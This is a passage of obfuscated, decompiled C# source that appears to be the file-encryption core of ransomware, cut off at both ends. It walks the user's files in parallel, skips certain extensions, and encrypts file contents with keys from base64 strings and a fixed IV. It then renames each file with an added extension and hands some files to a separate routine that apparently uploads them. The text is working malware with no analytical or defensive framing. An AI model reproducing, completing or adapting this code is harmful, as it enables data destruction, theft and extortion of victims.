					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						CBQRiXwqhEScXz(WindowsIdentity.GetCurrent().Name, CS_0024_003C_003E8__locals0.AVXbhEVgDtzcsv);
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
			if (XedFtYAsIv == qZvJdNwKrAHeP.getString_0(107396946))
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					SgQPOQfDSyhRE(CS_0024_003C_003E8__locals0.AVXbhEVgDtzcsv, CS_0024_003C_003E8__locals0.KTVVpMilaQ.PvihqEsdNvpBrf, CS_0024_003C_003E8__locals0.KTVVpMilaQ.EvSRjoDRbsbERQal, CS_0024_003C_003E8__locals0.KTVVpMilaQ.VokRtgjrfwZGT, CS_0024_003C_003E8__locals0.KTVVpMilaQ.togHzByXlVeVj);
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = false;
				thread2.Start();
				thread2.Join();
			}
			else
			{
				SgQPOQfDSyhRE(CS_0024_003C_003E8__locals0.AVXbhEVgDtzcsv, CS_0024_003C_003E8__locals0.PvihqEsdNvpBrf, CS_0024_003C_003E8__locals0.EvSRjoDRbsbERQal, CS_0024_003C_003E8__locals0.VokRtgjrfwZGT, CS_0024_003C_003E8__locals0.togHzByXlVeVj);
			}
		});
	}

	public static void SgQPOQfDSyhRE(string string_0, string[] string_1, string string_2, string[] string_3, string string_4)
	{
		List<string> list = new List<string>();
		List<string> list2 = new List<string>();
		list2.Add(getString_0(107391504));
		List<string> list3 = list2;
		if (YTZvEldDkPpHZ == getString_0(107397192))
		{
			list = ZxSgomMsDMH(string_0, string_1, string_2, string_3, string_4);
			return;
		}
		list = uyJDsIgMSl.SearchFiles(string_0);
		foreach (string text in string_1)
		{
			foreach (string item in list)
			{
				if (string_3.Length != 0)
				{
					int num = 0;
					while (num < string_3.Length)
					{
						string value = string_3[num];
						if (!item.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_039b;
					}
				}
				if ((NfFarPiJPL == getString_0(107397192) && !item.EndsWith(text)) || eSzXPgKVtFvzPRkO.Contains(item))
				{
					continue;
				}
				if (eWnObXCrwa == getString_0(107396935))
				{
					try
					{
						if (YufxSSxUJJOSIn.VYJIPfkRIyod(item))
						{
							YufxSSxUJJOSIn.hNKWXHlxoAtPCiYq(item);
						}
					}
					catch
					{
					}
				}
				eSzXPgKVtFvzPRkO.Add(item);
				if (!MoDypcoPNXgE.Contains(Path.GetDirectoryName(item)))
				{
					MoDypcoPNXgE.Add(Path.GetDirectoryName(item));
				}
				try
				{
					FileStream fileStream = new FileStream(item, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (pxgfCwkrtMaZuuMB == getString_0(107396935) && fileStream.Length > Convert.ToInt32(reMazhEZDt) * 1024 * 1024 && !list3.Contains(text))
					{
						if (ZQgJcWfPvJPQ == getString_0(107396935))
						{
							foreach (string item2 in CCPXDRhgflzG)
							{
								if (item.ToLower().EndsWith(item2) && pvxdiQpIegI == getString_0(107396935))
								{
									if (Convert.ToInt32(WciFeGiWIPgj) * 1024 * 1024 > fileStream.Length)
									{
										try
										{
											OTEZtdtAZBqJ.jhrZoqvdXpIRCMN(getString_0(107391553), getString_0(107391548), getString_0(107391567), item);
										}
										catch
										{
										}
									}
								}
								else if (item.ToLower().EndsWith(item2) && pvxdiQpIegI == getString_0(107397192))
								{
									try
									{
										OTEZtdtAZBqJ.jhrZoqvdXpIRCMN(getString_0(107391553), getString_0(107391548), getString_0(107391567), item);
									}
									catch
									{
									}
								}
							}
						}
						fileStream.Dispose();
						byte[] byte_ = JCghqZmaNmX.sRBPBEhfdE(item, Convert.ToInt32(reMazhEZDt) * 1024 * 1024);
						byte[] yfXnuFcJvJQ = JCghqZmaNmX.mmAjtCaUmxxI(byte_, Convert.FromBase64String(string_4), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
						JCghqZmaNmX.EAuQzPgdvEdb(item, yfXnuFcJvJQ);
						if (string_2 != getString_0(107388299))
						{
							File.Move(item, item + string_2);
						}
					}
					else if (string_2 != getString_0(107388299))
					{
						NfKUjHGMFaQF(item, item + string_2, ignBTzWcyfBJ);
					}
					else
					{
						NfKUjHGMFaQF(item, item + getString_0(107388294), ignBTzWcyfBJ);
					}
				}
				catch (Exception)
				{
				}
				IL_039b:;
			}
		}
	}

	public static void qSfJOKtiXJPB(List<string> list_0, string[] string_0, string string_1, string[] string_2, string string_3)
	{
		AAfgHfRmqtNe.BkBzGKaNvQht CS_0024_003C_003E8__locals0 = new AAfgHfRmqtNe();
		CS_0024_003C_003E8__locals0.nvCiGIukQFkQKz = list_0;
		CS_0024_003C_003E8__locals0.HuMjnShEiYDem = string_1;
		CS_0024_003C_003E8__locals0.bNesffFghe = string_2;
		CS_0024_003C_003E8__locals0.geYnJRldqTc = string_3;
		CS_0024_003C_003E8__locals0.MLGPBiBMcj = new List<string> { getString_0(107391504) };
		if (NfFarPiJPL == getString_0(107397192))
		{
			Parallel.ForEach(string_0, delegate(string string_0)
			{
				foreach (string item in CS_0024_003C_003E8__locals0.nvCiGIukQFkQKz)
				{
					if (CS_0024_003C_003E8__locals0.bNesffFghe.Length != 0)
					{
						string[] bNesffFghe2 = CS_0024_003C_003E8__locals0.bNesffFghe;
						int num2 = 0;
						while (num2 < bNesffFghe2.Length)
						{
							string value2 = bNesffFghe2[num2];
							if (!item.EndsWith(value2))
							{
								num2++;
								continue;
							}
							goto IL_09a3;
						}
					}
					try
					{
						if (item.EndsWith(CS_0024_003C_003E8__locals0.HuMjnShEiYDem))
						{
							goto IL_09a3;
						}
					}
					catch (Exception)
					{
						goto IL_09a3;
					}
					if (item.EndsWith(string_0) && !eSzXPgKVtFvzPRkO.Contains(item))
					{
						if (eWnObXCrwa == AAfgHfRmqtNe.getString_0(107396954))
						{
							try
							{
								if (YufxSSxUJJOSIn.VYJIPfkRIyod(item))
								{
									YufxSSxUJJOSIn.hNKWXHlxoAtPCiYq(item);
								}
							}
							catch
							{
							}
						}
						eSzXPgKVtFvzPRkO.Add(item);
						if (!MoDypcoPNXgE.Contains(Path.GetDirectoryName(item)))
						{
							MoDypcoPNXgE.Add(Path.GetDirectoryName(item));
						}
						WlGzlJNuBzaw(item);
						try
						{
							new ErRhqyAlKQbUV().MdtMYqjRlsPva(item);
						}
						catch
						{
						}
						try
						{
							using FileStream fileStream2 = new FileStream(item, FileMode.Open, FileAccess.Write);
							if (!fileStream2.CanWrite)
							{
								try
								{
									if (COsiatrWvUa)
									{
										Console.WriteLine(AAfgHfRmqtNe.getString_0(107405082) + item + AAfgHfRmqtNe.getString_0(107405005) + new FileInfo(item).Length + AAfgHfRmqtNe.getString_0(107405016));
										Console.WriteLine(AAfgHfRmqtNe.getString_0(107404975));
									}
								}
								catch
								{
								}
								OrQEYkCSRFdRrs(dOioDTBjWKE(AAfgHfRmqtNe.getString_0(107405414)), AAfgHfRmqtNe.getString_0(107390556) + item + AAfgHfRmqtNe.getString_0(107390556) + dOioDTBjWKE(AAfgHfRmqtNe.getString_0(107405357)) + AAfgHfRmqtNe.getString_0(107390556) + Environment.UserName + AAfgHfRmqtNe.getString_0(107390556) + dOioDTBjWKE(AAfgHfRmqtNe.getString_0(107405372)));
							}
						}
						catch (Exception ex16)
						{
							if (JkprrzFPchvjDH)
							{
								try
								{
									File.AppendAllText(AIOBtLgIwjoLs, AAfgHfRmqtNe.getString_0(107388058) + item + AAfgHfRmqtNe.getString_0(107405347) + ex16.Message + AAfgHfRmqtNe.getString_0(107396721));
								}
								catch (Exception)
								{
								}
							}
							continue;
						}
						try
						{
							try
							{
								if (new FileInfo(item).Length != 0L)
								{
									goto end_IL_02cd;
								}
								goto end_IL_02cd_2;
								end_IL_02cd:;
							}
							catch (Exception ex18)
							{
								if (JkprrzFPchvjDH)
								{
									try
									{
										File.AppendAllText(AIOBtLgIwjoLs, AAfgHfRmqtNe.getString_0(107388058) + item + AAfgHfRmqtNe.getString_0(107405234) + ex18.Message + AAfgHfRmqtNe.getString_0(107396721));
									}
									catch (Exception)
									{
									}
								}
								rYmLUpWPpFDd++;
								goto end_IL_02cd_2;
							}
							if (!(pxgfCwkrtMaZuuMB == AAfgHfRmqtNe.getString_0(107396954)) || new FileInfo(item).Length <= Convert.ToInt32(reMazhEZDt) * 1024 * 1024 || CS_0024_003C_003E8__locals0.MLGPBiBMcj.Contains(string_0))
							{
								if (pkQDLnznjdsc)
								{
									CS_0024_003C_003E8__locals0.HuMjnShEiYDem = UKBmvHPuuZLTSs + CS_0024_003C_003E8__locals0.HuMjnShEiYDem;
								}
								string text5 = mPZHeAmBXOW.NknwnSRhtiQplA(32);
								string text6 = AAfgHfRmqtNe.getString_0(107391523);
								text6 = (intMyWSRTiS ? mPZHeAmBXOW.IDARSyoZrvbC() : AAfgHfRmqtNe.getString_0(107391523));
								string s3 = GzxfJecXtrCbXb.kbfqQxGdxRHX(text5 + text6);
								byte[] bytes3 = Encoding.ASCII.GetBytes(s3);
								if (CS_0024_003C_003E8__locals0.HuMjnShEiYDem != AAfgHfRmqtNe.getString_0(107388318))
								{
									if (!gBBPJhiOSqWIX)
									{
										if (!intMyWSRTiS)
										{
											XhyOceWttqVUAc(item, item + CS_0024_003C_003E8__locals0.HuMjnShEiYDem, ignBTzWcyfBJ);
										}
										else
										{
											XhyOceWttqVUAc(item, item + CS_0024_003C_003E8__locals0.HuMjnShEiYDem, Convert.FromBase64String(text5));
										}
									}
									else
									{
										try
										{
											if (!intMyWSRTiS)
											{
												MCelMqaTtIYudae(item, item + CS_0024_003C_003E8__locals0.HuMjnShEiYDem, ignBTzWcyfBJ, Convert.FromBase64String(QcVyigtSkYPoO));
											}
											else
											{
												MCelMqaTtIYudae(item, item + CS_0024_003C_003E8__locals0.HuMjnShEiYDem, Convert.FromBase64String(text5), Convert.FromBase64String(text6));
											}
										}
										catch (Exception ex20)
										{
											if (JkprrzFPchvjDH)
											{
												try
												{
													File.AppendAllText(AIOBtLgIwjoLs, AAfgHfRmqtNe.getString_0(107388058) + item + AAfgHfRmqtNe.getString_0(107387760) + ex20.Message + AAfgHfRmqtNe.getString_0(107396721));
												}
												catch (Exception)
												{
												}
											}
											rYmLUpWPpFDd++;
											try
											{
												File.Move(item + CS_0024_003C_003E8__locals0.HuMjnShEiYDem, item);
											}
											catch (Exception)
											{
											}
											goto end_IL_02cd_2;
										}
									}
								}
								else if (!gBBPJhiOSqWIX)
								{
									if (!intMyWSRTiS)
									{
										XhyOceWttqVUAc(item, item + AAfgHfRmqtNe.getString_0(107388313), ignBTzWcyfBJ);
									}
									else
									{
										XhyOceWttqVUAc(item, item + AAfgHfRmqtNe.getString_0(107388313), Convert.FromBase64String(text5));
									}
								}
								else
								{
									try
									{
										if (!intMyWSRTiS)
										{
											MCelMqaTtIYudae(item, item, ignBTzWcyfBJ, Convert.FromBase64String(QcVyigtSkYPoO));
										}
										else
										{
											MCelMqaTtIYudae(item, item, Convert.FromBase64String(text5), Convert.FromBase64String(text6));
										}
									}
									catch (Exception ex23)
									{
										if (JkprrzFPchvjDH)
										{
											try
											{
												File.AppendAllText(AIOBtLgIwjoLs, AAfgHfRmqtNe.getString_0(107388058) + item + AAfgHfRmqtNe.getString_0(107387760) + ex23.Message + AAfgHfRmqtNe.getString_0(107396721));
											}
											catch (Exception)
											{
											}
										}
										rYmLUpWPpFDd++;
										goto end_IL_02cd_2;
									}
								}
								if (intMyWSRTiS)
								{
									if (CS_0024_003C_003E8__locals0.HuMjnShEiYDem != AAfgHfRmqtNe.getString_0(107388318))
									{
										JrgWtVXefnyJtd(item + CS_0024_003C_003E8__locals0.HuMjnShEiYDem, bytes3);
									}
									else
									{
										JrgWtVXefnyJtd(item, bytes3);
									}
								}
								goto IL_09a3;
							}
							CS_0024_003C_003E8__locals0 = new AAfgHfRmqtNe.TAoKAgEBIcUr();
							CS_0024_003C_003E8__locals0.BPGxpEKBxK = CS_0024_003C_003E8__locals0;
							try
							{
								if (CS_0024_003C_003E8__locals0.HuMjnShEiYDem != AAfgHfRmqtNe.getString_0(107388318))
								{
									if (pkQDLnznjdsc)
									{
										CS_0024_003C_003E8__locals0.HuMjnShEiYDem = UKBmvHPuuZLTSs + CS_0024_003C_003E8__locals0.HuMjnShEiYDem;
									}
									File.Move(item, item + CS_0024_003C_003E8__locals0.HuMjnShEiYDem);
								}
							}
							catch (Exception ex25)
							{
								if (JkprrzFPchvjDH)
								{
									try
									{
										File.AppendAllText(AIOBtLgIwjoLs, AAfgHfRmqtNe.getString_0(107388058) + item + AAfgHfRmqtNe.getString_0(107404661) + ex25.Message + AAfgHfRmqtNe.getString_0(107396721));
									}
									catch (Exception)
									{
									}
								}
								rYmLUpWPpFDd++;
								goto end_IL_02cd_2;
							}
							CS_0024_003C_003E8__locals0.gXKnDbtqZVr = AAfgHfRmqtNe.getString_0(107391523);
							if (CS_0024_003C_003E8__locals0.HuMjnShEiYDem != AAfgHfRmqtNe.getString_0(107388318))
							{
								CS_0024_003C_003E8__locals0.gXKnDbtqZVr = item + CS_0024_003C_003E8__locals0.HuMjnShEiYDem;
							}
							else
							{
								CS_0024_003C_003E8__locals0.gXKnDbtqZVr = item;
							}
							if (ZQgJcWfPvJPQ == AAfgHfRmqtNe.getString_0(107396954))
							{
								Thread thread2 = new Thread((ThreadStart)delegate
								{
									foreach (string item2 in CCPXDRhgflzG)
									{
										if (CS_0024_003C_003E8__locals0.gXKnDbtqZVr.ToLower().EndsWith(item2 + CS_0024_003C_003E8__locals0.BPGxpEKBxK.HuMjnShEiYDem) && pvxdiQpIegI == AAfgHfRmqtNe.TAoKAgEBIcUr.getString_0(107396957))
										{
											if (Convert.ToInt32(WciFeGiWIPgj) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.gXKnDbtqZVr).Length)
											{
												try
												{
													OTEZtdtAZBqJ.jhrZoqvdXpIRCMN(AAfgHfRmqtNe.TAoKAgEBIcUr.getString_0(107391575), AAfgHfRmqtNe.TAoKAgEBIcUr.getString_0(107391570), AAfgHfRmqtNe.TAoKAgEBIcUr.getString_0(107391589), CS_0024_003C_003E8__locals0.gXKnDbtqZVr);
												}
												catch
												{
												}
											}
										}
										else if (CS_0024_003C_003E8__locals0.gXKnDbtqZVr.ToLower().EndsWith(item2) && pvxdiQpIegI == AAfgHfRmqtNe.TAoKAgEBIcUr.getString_0(107397214))
										{
											try
											{
												OTEZtdtAZBqJ.jhrZoqvdXpIRCMN(AAfgHfRmqtNe.TAoKAgEBIcUr.getString_0(107391575), AAfgHfRmqtNe.TAoKAgEBIcUr.getString_0(107391570), AAfgHfRmqtNe.TAoKAgEBIcUr.getString_0(107391589), CS_0024_003C_003E8__locals0.gXKnDbtqZVr);
											}
											catch
											{
											}
										}
									}
								});
								thread2.Priority = ThreadPriority.Normal;
								thread2.IsBackground = false;
								thread2.Start();
							}
							string text7 = mPZHeAmBXOW.NknwnSRhtiQplA(32);
							string text8 = AAfgHfRmqtNe.getString_0(107391523);
							text8 = (intMyWSRTiS ? mPZHeAmBXOW.IDARSyoZrvbC() : AAfgHfRmqtNe.getString_0(107391523));
							string s4 = GzxfJecXtrCbXb.kbfqQxGdxRHX(text7 + text8);
							byte[] bytes4 = Encoding.ASCII.GetBytes(s4);
							byte[] array2 = null;
							byte[] byte_2 = JCghqZmaNmX.sRBPBEhfdE(CS_0024_003C_003E8__locals0.gXKnDbtqZVr, Convert.ToInt32(reMazhEZDt) * 1024 * 1024);
							if (JCghqZmaNmX.EAuQzPgdvEdb(YfXnuFcJvJQ: (!nWlczaiPXm) ? (intMyWSRTiS ? JCghqZmaNmX.mmAjtCaUmxxI(byte_2, Convert.FromBase64String(text7), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : JCghqZmaNmX.mmAjtCaUmxxI(byte_2, Convert.FromBase64String(CS_0024_003C_003E8__locals0.geYnJRldqTc), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (intMyWSRTiS ? RIdkSiOBtCCfM.LbymaNjlWfqxKnw(byte_2, Convert.FromBase64String(text7), Convert.FromBase64String(text8)) : RIdkSiOBtCCfM.LbymaNjlWfqxKnw(byte_2, Convert.FromBase64String(CS_0024_003C_003E8__locals0.geYnJRldqTc), Convert.FromBase64String(QcVyigtSkYPoO))), XrDEgIqvtimnb: CS_0024_003C_003E8__locals0.gXKnDbtqZVr, ihfgVyorCHJcqa: bytes4))
							{
								goto IL_09a3;
							}
							try
							{
								File.Move(item + CS_0024_003C_003E8__locals0.HuMjnShEiYDem, item);
							}
							catch (Exception)
							{
							}
							end_IL_02cd_2:;
						}
						catch (Exception)
						{
							goto IL_09a3;
						}
					}
					continue;
					IL_09a3:
					CS_0024_003C_003E8__locals0.nvCiGIukQFkQKz.Remove(item);
				}
			});
			return;
		}
		Parallel.ForEach(CS_0024_003C_003E8__locals0.nvCiGIukQFkQKz, delegate(string string_0)
		{
			CS_0024_003C_003E8__locals0 = new AAfgHfRmqtNe.BkBzGKaNvQht();
			CS_0024_003C_003E8__locals0.BPGxpEKBxK = CS_0024_003C_003E8__locals0;
			CS_0024_003C_003E8__locals0.SCkCsxQVoqw = string_0;
			if (CS_0024_003C_003E8__locals0.bNesffFghe.Length != 0)
			{
				string[] bNesffFghe = CS_0024_003C_003E8__locals0.bNesffFghe;
				int num = 0;
				while (num < bNesffFghe.Length)
				{
					string value = bNesffFghe[num];
					if (!CS_0024_003C_003E8__locals0.SCkCsxQVoqw.EndsWith(value))
					{
						num++;
						continue;
					}
					goto IL_0a6b;
				}
			}
			try
			{
				if (CS_0024_003C_003E8__locals0.SCkCsxQVoqw.EndsWith(CS_0024_003C_003E8__locals0.HuMjnShEiYDem))
				{
					goto IL_0a6b;
				}
			}
			catch (Exception)
			{
				goto IL_0a6b;
			}
			if (!eSzXPgKVtFvzPRkO.Contains(CS_0024_003C_003E8__locals0.SCkCsxQVoqw))
			{
				if (eWnObXCrwa == AAfgHfRmqtNe.getString_0(107396954))
				{
					try
					{
						if (YufxSSxUJJOSIn.VYJIPfkRIyod(CS_0024_003C_003E8__locals0.SCkCsxQVoqw))
						{
							YufxSSxUJJOSIn.hNKWXHlxoAtPCiYq(CS_0024_003C_003E8__locals0.SCkCsxQVoqw);
						}
					}
					catch
					{
					}
				}
				eSzXPgKVtFvzPRkO.Add(CS_0024_003C_003E8__locals0.SCkCsxQVoqw);
				if (!MoDypcoPNXgE.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.SCkCsxQVoqw)))
				{
					MoDypcoPNXgE.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.SCkCsxQVoqw));
				}
				WlGzlJNuBzaw(CS_0024_003C_003E8__locals0.SCkCsxQVoqw);
				try
				{
					new ErRhqyAlKQbUV().MdtMYqjRlsPva(CS_0024_003C_003E8__locals0.SCkCsxQVoqw);
				}
				catch
				{
				}
				try
				{
					using FileStream fileStream = new FileStream(CS_0024_003C_003E8__locals0.SCkCsxQVoqw, FileMode.Open, FileAccess.Write);
					if (!fileStream.CanWrite)
					{
						try
						{
							if (COsiatrWvUa)
							{
								Console.WriteLine(AAfgHfRmqtNe.getString_0(107405082) + CS_0024_003C_003E8__locals0.SCkCsxQVoqw + AAfgHfRmqtNe.getString_0(107405005) + new FileInfo(CS_0024_003C_003E8__locals0.SCkCsxQVoqw).Length + AAfgHfRmqtNe.getString_0(107405016));
								Console.WriteLine(AAfgHfRmqtNe.getString_0(107404975));
							}
						}
						catch
						{
						}
						OrQEYkCSRFdRrs(dOioDTBjWKE(AAfgHfRmqtNe.getString_0(107405414)), AAfgHfRmqtNe.getString_0(107390556) + CS_0024_003C_003E8__locals0.SCkCsxQVoqw + AAfgHfRmqtNe.getString_0(107390556) + dOioDTBjWKE(AAfgHfRmqtNe.getString_0(107405357)) + AAfgHfRmqtNe.getString_0(107390556) + Environment.UserName + AAfgHfRmqtNe.getString_0(107390556) + dOioDTBjWKE(AAfgHfRmqtNe.getString_0(107405372)));
					}
				}
				catch (Exception ex2)
				{
					if (JkprrzFPchvjDH)
					{
						try
						{
							File.AppendAllText(AIOBtLgIwjoLs, AAfgHfRmqtNe.getString_0(107388058) + CS_0024_003C_003E8__locals0.SCkCsxQVoqw + AAfgHfRmqtNe.getString_0(107405347) + ex2.Message + AAfgHfRmqtNe.getString_0(107396721));
							return;
						}
						catch (Exception)
						{
							return;
						}
					}
					return;
				}
				try
				{
					try
					{
						if (new FileInfo(CS_0024_003C_003E8__locals0.SCkCsxQVoqw).Length != 0L)
						{
							goto end_IL_031d;
						}
						goto end_IL_031d_2;
						end_IL_031d:;
					}
					catch (Exception ex4)
					{
						if (JkprrzFPchvjDH)
						{
							try
							{
								File.AppendAllText(AIOBtLgIwjoLs, AAfgHfRmqtNe.getString_0(107388058) + CS_0024_003C_003E8__locals0.SCkCsxQVoqw + AAfgHfRmqtNe.getString_0(107405234) + ex4.Message + AAfgHfRmqtNe.getString_0(107396721));
							}
							catch (Exception)
							{
							}
						}
						rYmLUpWPpFDd++;
						goto end_IL_031d_2;
					}
					if (pxgfCwkrtMaZuuMB == AAfgHfRmqtNe.getString_0(107396954) && new FileInfo(CS_0024_003C_003E8__locals0.SCkCsxQVoqw).Length > Convert.ToInt32(reMazhEZDt) * 1024 * 1024)
					{
						try
						{
							if (CS_0024_003C_003E8__locals0.HuMjnShEiYDem != AAfgHfRmqtNe.getString_0(107388318))
							{
								if (pkQDLnznjdsc)
								{
									CS_0024_003C_003E8__locals0.HuMjnShEiYDem = UKBmvHPuuZLTSs + CS_0024_003C_003E8__locals0.HuMjnShEiYDem;
								}
								File.Move(CS_0024_003C_003E8__locals0.SCkCsxQVoqw, CS_0024_003C_003E8__locals0.SCkCsxQVoqw + CS_0024_003C_003E8__locals0.HuMjnShEiYDem);
							}
						}
						catch (Exception ex6)
						{
							if (JkprrzFPchvjDH)
							{
								try
								{
									File.AppendAllText(AIOBtLgIwjoLs, AAfgHfRmqtNe.getString_0(107388058) + CS_0024_003C_003E8__locals0.SCkCsxQVoqw + AAfgHfRmqtNe.getString_0(107404661) + ex6.Message + AAfgHfRmqtNe.getString_0(107396721));
								}
								catch (Exception)
								{
								}
							}
							rYmLUpWPpFDd++;
							return;
						}
						if (CS_0024_003C_003E8__locals0.HuMjnShEiYDem != AAfgHfRmqtNe.getString_0(107388318))
						{
							CS_0024_003C_003E8__locals0.SCkCsxQVoqw += CS_0024_003C_003E8__locals0.HuMjnShEiYDem;
						}
						if (ZQgJcWfPvJPQ == AAfgHfRmqtNe.getString_0(107396954))
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								foreach (string item3 in CCPXDRhgflzG)
								{
									if (CS_0024_003C_003E8__locals0.SCkCsxQVoqw.ToLower().EndsWith(item3 + CS_0024_003C_003E8__locals0.BPGxpEKBxK.HuMjnShEiYDem) && pvxdiQpIegI == AAfgHfRmqtNe.BkBzGKaNvQht.getString_0(107396960))
									{
										if (Convert.ToInt32(WciFeGiWIPgj) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.SCkCsxQVoqw).Length)
										{
											try
											{
												OTEZtdtAZBqJ.jhrZoqvdXpIRCMN(AAfgHfRmqtNe.BkBzGKaNvQht.getString_0(107391578), AAfgHfRmqtNe.BkBzGKaNvQht.getString_0(107391573), AAfgHfRmqtNe.BkBzGKaNvQht.getString_0(107391592), CS_0024_003C_003E8__locals0.SCkCsxQVoqw);
											}
											catch
											{
											}
										}
									}
									else if (CS_0024_003C_003E8__locals0.SCkCsxQVoqw.ToLower().EndsWith(item3) && pvxdiQpIegI == AAfgHfRmqtNe.BkBzGKaNvQht.getString_0(107397217))
									{
										try
										{
											OTEZtdtAZBqJ.jhrZoqvdXpIRCMN(AAfgHfRmqtNe.BkBzGKaNvQht.getString_0(107391578), AAfgHfRmqtNe.BkBzGKaNvQht.getString_0(107391573), AAfgHfRmqtNe.BkBzGKaNvQht.getString_0(107391592), CS_0024_003C_003E8__locals0.SCkCsxQVoqw);
										}
										catch
										{
										}
									}
								}
							});
							thread.IsBackground = false;
							thread.Priority = ThreadPriority.Normal;
							thread.Start();
						}
						string text = mPZHeAmBXOW.NknwnSRhtiQplA(32);
						string text2 = AAfgHfRmqtNe.getString_0(107391523);
						text2 = (intMyWSRTiS ? mPZHeAmBXOW.IDARSyoZrvbC() : AAfgHfRmqtNe.getString_0(107391523));
						string s = GzxfJecXtrCbXb.kbfqQxGdxRHX(text + text2);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						byte[] array = null;
						byte[] byte_ = JCghqZmaNmX.sRBPBEhfdE(CS_0024_003C_003E8__locals0.SCkCsxQVoqw, Convert.ToInt32(reMazhEZDt) * 1024 * 1024);
						if (!JCghqZmaNmX.EAuQzPgdvEdb(YfXnuFcJvJQ: (!nWlczaiPXm) ? (intMyWSRTiS ? JCghqZmaNmX.mmAjtCaUmxxI(byte_, Convert.FromBase64String(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : JCghqZmaNmX.mmAjtCaUmxxI(byte_, Convert.FromBase64String(CS_0024_003C_003E8__locals0.geYnJRldqTc), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (intMyWSRTiS ? RIdkSiOBtCCfM.LbymaNjlWfqxKnw(byte_, Convert.FromBase64String(text), Convert.FromBase64String(text2)) : RIdkSiOBtCCfM.LbymaNjlWfqxKnw(byte_, Convert.FromBase64String(CS_0024_003C_003E8__locals0.geYnJRldqTc), Convert.FromBase64String(QcVyigtSkYPoO))), XrDEgIqvtimnb: CS_0024_003C_003E8__locals0.SCkCsxQVoqw, ihfgVyorCHJcqa: bytes))
						{
							try
							{
								File.Move(CS_0024_003C_003E8__locals0.SCkCsxQVoqw + CS_0024_003C_003E8__locals0.HuMjnShEiYDem, CS_0024_003C_003E8__locals0.SCkCsxQVoqw);
								return;
							}
							catch (Exception)
							{
								return;
							}
						}
					}
					else
					{
						if (pkQDLnznjdsc)
						{
							CS_0024_003C_003E8__locals0.HuMjnShEiYDem = UKBmvHPuuZLTSs + CS_0024_003C_003E8__locals0.HuMjnShEiYDem;
						}
						string text3 = mPZHeAmBXOW.NknwnSRhtiQplA(32);
						string text4 = AAfgHfRmqtNe.getString_0(107391523);
						text4 = (intMyWSRTiS ? mPZHeAmBXOW.IDARSyoZrvbC() : AAfgHfRmqtNe.getString_0(107391523));
						string s2 = GzxfJecXtrCbXb.kbfqQxGdxRHX(text3 + text4);
						byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
						if (CS_0024_003C_003E8__locals0.HuMjnShEiYDem != AAfgHfRmqtNe.getString_0(107388318))
						{
							if (!gBBPJhiOSqWIX)
							{
								if (!intMyWSRTiS)
								{
									XhyOceWttqVUAc(CS_0024_003C_003E8__locals0.SCkCsxQVoqw, CS_0024_003C_003E8__locals0.SCkCsxQVoqw + CS_0024_003C_003E8__locals0.HuMjnShEiYDem, ignBTzWcyfBJ);
								}
								else
								{
									XhyOceWttqVUAc(CS_0024_003C_003E8__locals0.SCkCsxQVoqw, CS_0024_003C_003E8__locals0.SCkCsxQVoqw + CS_0024_003C_003E8__locals0.HuMjnShEiYDem, Convert.FromBase64String(text3));
								}
							}
							else
							{
								try
								{
									if (!intMyWSRTiS)
									{
										MCelMqaTtIYudae(CS_0024_003C_003E8__locals0.SCkCsxQVoqw, CS_0024_003C_003E8__locals0.SCkCsxQVoqw + CS_0024_003C_003E8__locals0.HuMjnShEiYDem, ignBTzWcyfBJ, Convert.FromBase64String(QcVyigtSkYPoO));
									}
									else
									{
										MCelMqaTtIYudae(CS_0024_003C_003E8__locals0.SCkCsxQVoqw, CS_0024_003C_003E8__locals0.SCkCsxQVoqw + CS_0024_003C_003E8__locals0.HuMjnShEiYDem, Convert.FromBase64String(text3), Convert.FromBase64String(text4));
									}
								}
								catch (Exception ex9)
								{
									if (JkprrzFPchvjDH)
									{
										try
										{
											File.AppendAllText(AIOBtLgIwjoLs, AAfgHfRmqtNe.getString_0(107388058) + CS_0024_003C_003E8__locals0.SCkCsxQVoqw + AAfgHfRmqtNe.getString_0(107387760) + ex9.Message + AAfgHfRmqtNe.getString_0(107396721));
										}
										catch (Exception)
										{
										}
									}
									rYmLUpWPpFDd++;
									try
									{
										File.Move(CS_0024_003C_003E8__locals0.SCkCsxQVoqw + CS_0024_003C_003E8__locals0.HuMjnShEiYDem, CS_0024_003C_003E8__locals0.SCkCsxQVoqw);
										return;
									}
									catch (Exception)
									{
										return;
									}
								}
							}
						}
						else if (!gBBPJhiOSqWIX)
						{
							if (!intMyWSRTiS)
							{
								XhyOceWttqVUAc(CS_0024_003C_003E8__locals0.SCkCsxQVoqw, CS_0024_003C_003E8__locals0.SCkCsxQVoqw + AAfgHfRmqtNe.getString_0(107388313), ignBTzWcyfBJ);
							}
							else
							{
								XhyOceWttqVUAc(CS_0024_003C_003E8__locals0.SCkCsxQVoqw, CS_0024_003C_003E8__locals0.SCkCsxQVoqw + AAfgHfRmqtNe.getString_0(107388313), Convert.FromBase64String(text3));
							}
						}
						else
						{
							try
							{
								if (!intMyWSRTiS)
								{
									MCelMqaTtIYudae(CS_0024_003C_003E8__locals0.SCkCsxQVoqw, CS_0024_003C_003E8__locals0.SCkCsxQVoqw, ignBTzWcyfBJ, Convert.FromBase64String(QcVyigtSkYPoO));
								}
								else
								{
									MCelMqaTtIYudae(CS_0024_003C_003E8__locals0.SCkCsxQVoqw, CS_0024_003C_003E8__locals0.SCkCsxQVoqw, Convert.FromBase64String(text3), Convert.FromBase64String(text4));
								}
							}
							catch (Exception ex12)
							{
								if (JkprrzFPchvjDH)
								{
									try
									{
